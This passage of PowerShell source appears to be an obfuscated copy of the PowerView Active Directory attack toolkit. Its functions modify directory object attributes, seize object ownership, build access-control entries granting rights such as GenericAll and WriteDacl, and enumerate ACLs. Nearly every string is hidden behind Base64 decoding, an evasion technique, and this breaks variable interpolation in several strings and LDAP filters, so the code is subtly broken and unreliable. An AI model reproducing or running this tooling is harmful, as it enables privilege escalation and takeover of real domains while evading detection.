        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
    }

    PROCESS {
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk=")))] = $Identity }

        
        $RawObject = Get-DomainObject @SearcherArguments

        ForEach ($Object in $RawObject) {

            $Entry = $RawObject.GetDirectoryEntry()

            if($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2V0")))]) {
                try {
                    $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2V0")))].GetEnumerator() | ForEach-Object {
                        Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W1NldC1Eb21haW5PYmplY3RdIFNldHRpbmcgJ3swfScgdG8gJ3sxfScgZm9yIG9iamVjdCAnezJ9"))) -f $($_.Name), $($_.Value), $($RawObject.Properties.samaccountname))
                        $Entry.put($_.Name, $_.Value)
                    }
                    $Entry.commitchanges()
                }
                catch {
                    Write-Warning (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W1NldC1Eb21haW5PYmplY3RdIEVycm9yIHNldHRpbmcvcmVwbGFjaW5nIHByb3BlcnRpZXMgZm9yIG9iamVjdCAnezB9JyA6IHsxfQ=="))) -f $($RawObject.Properties.samaccountname), $_)
                }
            }
            if($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WE9S")))]) {
                try {
                    $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WE9S")))].GetEnumerator() | ForEach-Object {
                        $PropertyName = $_.Name
                        $PropertyXorValue = $_.Value
                        Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W1NldC1Eb21haW5PYmplY3RdIFhPUmluZyAnJFByb3BlcnR5TmFtZScgd2l0aCAnJFByb3BlcnR5WG9yVmFsdWUnIGZvciBvYmplY3QgJ3swfQ=="))) -f $($RawObject.Properties.samaccountname))
                        $TypeName = $Entry.$PropertyName[0].GetType().name

                        
                        $PropertyValue = $($Entry.$PropertyName) -bxor $PropertyXorValue
                        $Entry.$PropertyName = $PropertyValue -as $TypeName
                    }
                    $Entry.commitchanges()
                }
                catch {
                    Write-Warning (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W1NldC1Eb21haW5PYmplY3RdIEVycm9yIFhPUidpbmcgcHJvcGVydGllcyBmb3Igb2JqZWN0ICd7MH0nIDogezF9"))) -f $($RawObject.Properties.samaccountname), $_)
                }
            }
            if($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q2xlYXI=")))]) {
                try {
                    $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q2xlYXI=")))] | ForEach-Object {
                        $PropertyName = $_
                        Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W1NldC1Eb21haW5PYmplY3RdIENsZWFyaW5nICckUHJvcGVydHlOYW1lJyBmb3Igb2JqZWN0ICd7MH0="))) -f $($RawObject.Properties.samaccountname))
                        $Entry.$PropertyName.clear()
                    }
                    $Entry.commitchanges()
                }
                catch {
                    Write-Warning (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W1NldC1Eb21haW5PYmplY3RdIEVycm9yIGNsZWFyaW5nIHByb3BlcnRpZXMgZm9yIG9iamVjdCAnezB9JyA6IHsxfQ=="))) -f $($RawObject.Properties.samaccountname), $_)
                }
            }
        }
    }
}


function ConvertFrom-LDAPLogonHours {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LogonHours')]
    [CmdletBinding()]
    Param (
        [Parameter( ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [byte[]]
        $LogonHoursArray
    )

    Begin {
        if($LogonHoursArray.Count -ne 21) {
            throw ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TG9nb25Ib3Vyc0FycmF5IGlzIHRoZSBpbmNvcnJlY3QgbGVuZ3Ro")))
        }

        function ConvertTo-LogonHoursArray {
            Param (
                [int[]]
                $HoursArr
            )

            $LogonHours = New-Object bool[] 24
            for($i=0; $i -lt 3; $i++) {
                $Byte = $HoursArr[$i]
                $Offset = $i * 8
                $Str = [Convert]::ToString($Byte,2).PadLeft(8,([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MA=="))))

                $LogonHours[$Offset+0] = [bool] [convert]::ToInt32([string]$Str[7])
                $LogonHours[$Offset+1] = [bool] [convert]::ToInt32([string]$Str[6])
                $LogonHours[$Offset+2] = [bool] [convert]::ToInt32([string]$Str[5])
                $LogonHours[$Offset+3] = [bool] [convert]::ToInt32([string]$Str[4])
                $LogonHours[$Offset+4] = [bool] [convert]::ToInt32([string]$Str[3])
                $LogonHours[$Offset+5] = [bool] [convert]::ToInt32([string]$Str[2])
                $LogonHours[$Offset+6] = [bool] [convert]::ToInt32([string]$Str[1])
                $LogonHours[$Offset+7] = [bool] [convert]::ToInt32([string]$Str[0])
            }

            $LogonHours
        }
    }

    Process {
        $Output = @{
            Sunday = ConvertTo-LogonHoursArray -HoursArr $LogonHoursArray[0..2]
            Monday = ConvertTo-LogonHoursArray -HoursArr $LogonHoursArray[3..5]
            Tuesday = ConvertTo-LogonHoursArray -HoursArr $LogonHoursArray[6..8]
            Wednesday = ConvertTo-LogonHoursArray -HoursArr $LogonHoursArray[9..11]
            Thurs = ConvertTo-LogonHoursArray -HoursArr $LogonHoursArray[12..14]
            Friday = ConvertTo-LogonHoursArray -HoursArr $LogonHoursArray[15..17]
            Saturday = ConvertTo-LogonHoursArray -HoursArr $LogonHoursArray[18..20]
        }

        $Output = New-Object PSObject -Property $Output
        $Output.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LkxvZ29uSG91cnM="))))
        $Output
    }
}


function New-ADObjectAccessControlEntry {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Security.AccessControl.AuthorizationRule')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True, Mandatory = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        $PrincipalIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        $PrincipalDomain,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3VidHJlZQ=="))),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $True)]
        [ValidateSet('AccessSystemSecurity', 'CreateChild','Delete','DeleteChild','DeleteTree','ExtendedRight','GenericAll','GenericExecute','GenericRead','GenericWrite','ListChildren','ListObject','ReadControl','ReadProperty','Self','Synchronize','WriteDacl','WriteOwner','WriteProperty')]
        $Right,

        [Parameter(Mandatory = $True, ParameterSetName='AccessRuleType')]
        [ValidateSet('Allow', 'Deny')]
        [String[]]
        $AccessControlType,

        [Parameter(Mandatory = $True, ParameterSetName='AuditRuleType')]
        [ValidateSet('Success', 'Failure')]
        [String]
        $AuditFlag,

        [Parameter(Mandatory = $False, ParameterSetName='AccessRuleType')]
        [Parameter(Mandatory = $False, ParameterSetName='AuditRuleType')]
        [Parameter(Mandatory = $False, ParameterSetName='ObjectGuidLookup')]
        [Guid]
        $ObjectType,

        [ValidateSet('All', 'Children','Descendents','None','SelfAndChildren')]
        [String]
        $InheritanceType,

        [Guid]
        $InheritedObjectType
    )

    Begin {
        if ($PrincipalIdentity -notmatch ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XlMtMS0uKg==")))) {
            $PrincipalSearcherArguments = @{
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk="))) = $PrincipalIdentity
                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw=="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZGlzdGluZ3Vpc2hlZG5hbWUsb2JqZWN0c2lk")))
            }
            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJpbmNpcGFsRG9tYWlu")))]) { $PrincipalSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $PrincipalDomain }
            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $PrincipalSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $PrincipalSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $PrincipalSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $PrincipalSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $PrincipalSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $PrincipalSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
            $Principal = Get-DomainObject @PrincipalSearcherArguments
            if (-not $Principal) {
                throw ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VW5hYmxlIHRvIHJlc29sdmUgcHJpbmNpcGFsOiAkUHJpbmNpcGFsSWRlbnRpdHk=")))
            }
            elseif($Principal.Count -gt 1) {
                throw ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJpbmNpcGFsSWRlbnRpdHkgbWF0Y2hlcyBtdWx0aXBsZSBBRCBvYmplY3RzLCBidXQgb25seSBvbmUgaXMgYWxsb3dlZA==")))
            }
            $ObjectSid = $Principal.objectsid
        }
        else {
            $ObjectSid = $PrincipalIdentity
        }

        $ADRight = 0
        foreach($r in $Right) {
            $ADRight = $ADRight -bor (([System.DirectoryServices.ActiveDirectoryRights]$r).value__)
        }
        $ADRight = [System.DirectoryServices.ActiveDirectoryRights]$ADRight

        $Identity = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$ObjectSid)
    }

    Process {
        if($PSCmdlet.ParameterSetName -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QXVkaXRSdWxlVHlwZQ==")))) {

            if($ObjectType -eq $null -and $InheritanceType -eq [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, $ADRight, $AuditFlag
            } elseif($ObjectType -eq $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, $ADRight, $AuditFlag, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$InheritanceType)
            } elseif($ObjectType -eq $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -ne $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, $ADRight, $AuditFlag, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$InheritanceType), $InheritedObjectType
            } elseif($ObjectType -ne $null -and $InheritanceType -eq [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, $ADRight, $AuditFlag, $ObjectType
            } elseif($ObjectType -ne $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, $ADRight, $AuditFlag, $ObjectType, $InheritanceType
            } elseif($ObjectType -ne $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -ne $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, $ADRight, $AuditFlag, $ObjectType, $InheritanceType, $InheritedObjectType
            }

        }
        else {

            if($ObjectType -eq $null -and $InheritanceType -eq [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, $ADRight, $AccessControlType
            } elseif($ObjectType -eq $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, $ADRight, $AccessControlType, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$InheritanceType)
            } elseif($ObjectType -eq $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -ne $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, $ADRight, $AccessControlType, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$InheritanceType), $InheritedObjectType
            } elseif($ObjectType -ne $null -and $InheritanceType -eq [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, $ADRight, $AccessControlType, $ObjectType
            } elseif($ObjectType -ne $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -eq $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, $ADRight, $AccessControlType, $ObjectType, $InheritanceType
            } elseif($ObjectType -ne $null -and $InheritanceType -ne [String]::Empty -and $InheritedObjectType -ne $null) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $Identity, $ADRight, $AccessControlType, $ObjectType, $InheritanceType, $InheritedObjectType
            }

        }
    }
}


function Set-DomainObjectOwner {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        $Identity,

        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('Owner')]
        [String]
        $OwnerIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3VidHJlZQ=="))),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))] = $LDAPFilter }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))] = $SearchBase }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }

        $OwnerSid = Get-DomainObject @SearcherArguments -Identity $OwnerIdentity -Properties objectsid | Select-Object -ExpandProperty objectsid
        if ($OwnerSid) {
            $OwnerIdentityReference = [System.Security.Principal.SecurityIdentifier]$OwnerSid
        }
        else {
            Write-Warning ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W1NldC1Eb21haW5PYmplY3RPd25lcl0gRXJyb3IgcGFyc2luZyBvd25lciBpZGVudGl0eSAnJE93bmVySWRlbnRpdHk=")))
        }
    }

    PROCESS {
        if ($OwnerIdentityReference) {
            $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmF3")))] = $True
            $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk=")))] = $Identity

            
            $RawObject = Get-DomainObject @SearcherArguments

            ForEach ($Object in $RawObject) {
                try {
                    Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W1NldC1Eb21haW5PYmplY3RPd25lcl0gQXR0ZW1wdGluZyB0byBzZXQgdGhlIG93bmVyIGZvciAnJElkZW50aXR5JyB0byAnJE93bmVySWRlbnRpdHk=")))
                    $Entry = $RawObject.GetDirectoryEntry()
                    $Entry.PsBase.Options.SecurityMasks = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T3duZXI=")))
                    $Entry.PsBase.ObjectSecurity.SetOwner($OwnerIdentityReference)
                    $Entry.PsBase.CommitChanges()
                }
                catch {
                    Write-Warning (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W1NldC1Eb21haW5PYmplY3RPd25lcl0gRXJyb3Igc2V0dGluZyBvd25lcjogezB9"))) -f $_)
                }
            }
        }
    }
}


function Get-DomainObjectAcl {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ACL')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $Identity,

        [Switch]
        $Sacl,

        [Switch]
        $ResolveGUIDs,

        [String]
        [Alias('Rights')]
        [ValidateSet('All', 'ResetPassword', 'WriteMembers')]
        $RightsFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3VidHJlZQ=="))),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $SearcherArguments = @{
            'Properties' = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("c2FtYWNjb3VudG5hbWUsbnRzZWN1cml0eWRlc2NyaXB0b3IsZGlzdGluZ3Vpc2hlZG5hbWUsb2JqZWN0c2lk")))
        }

        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2FjbA==")))]) {
            $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VjdXJpdHlNYXNrcw==")))] = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2FjbA==")))
        }
        else {
            $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VjdXJpdHlNYXNrcw==")))] = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGFjbA==")))
        }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))] = $SearchBase }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
        $Searcher = Get-DomainSearcher @SearcherArguments

        $DomainGUIDMapArguments = @{}
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $DomainGUIDMapArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $DomainGUIDMapArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $DomainGUIDMapArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $DomainGUIDMapArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $DomainGUIDMapArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }

        
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzb2x2ZUdVSURz")))]) {
            $GUIDs = Get-DomainGUIDMap @DomainGUIDMapArguments
        }
    }

    PROCESS {
        if ($Searcher) {
            $IdentityFilter = ''
            $Filter = ''
            $Identity | Where-Object {$_} | ForEach-Object {
                $IdentityInstance = $_.Replace(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KA=="))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XDI4")))).Replace(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KQ=="))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XDI5"))))
                if ($IdentityInstance -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XlMtMS0uKg==")))) {
                    $IdentityFilter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KG9iamVjdHNpZD0kSWRlbnRpdHlJbnN0YW5jZSk=")))
                }
                elseif ($IdentityInstance -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XihDTnxPVXxEQyk9Lio=")))) {
                    $IdentityFilter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KGRpc3Rpbmd1aXNoZWRuYW1lPSRJZGVudGl0eUluc3RhbmNlKQ==")))
                    if ((-not $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) -and (-not $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))])) {
                        
                        
